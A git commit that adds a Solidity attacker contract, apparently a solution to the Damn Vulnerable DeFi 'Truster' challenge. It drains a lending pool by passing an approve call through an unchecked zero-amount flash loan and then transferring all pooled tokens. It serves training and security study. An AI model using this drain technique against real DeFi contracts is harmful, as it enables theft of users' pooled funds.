9f22c53fcd078b01ac37fa052ebfc7f8b03cae66
GeorgiKostadinovPro <kostadinovgeorgi16@gmail.com>
2024-11-18 15:58:59 +0200

    Create TrusterAttacker Contract

---
+++ test/truster/TrusterAttacker.sol
@@ -0,0 +1,24 @@
+pragma solidity =0.8.25;
+
+import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+
+contract TrusterAttacker {
+    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
+
+    function attack(address _pool, address _token, address _recovery) external {
+        bytes memory data = abi.encodeWithSelector(
+            DamnValuableToken(_token).approve,
+            _recovery,
+            TOKENS_IN_POOL
+        );
+
+        TrusterLenderPool(_pool).flashLoan(0, address(this), _token, data);
+
+        DamnValuableToken(_token).transferFrom(
+            _pool,
+            _recovery,
+            TOKENS_IN_POOL
+        );
+    }
+}
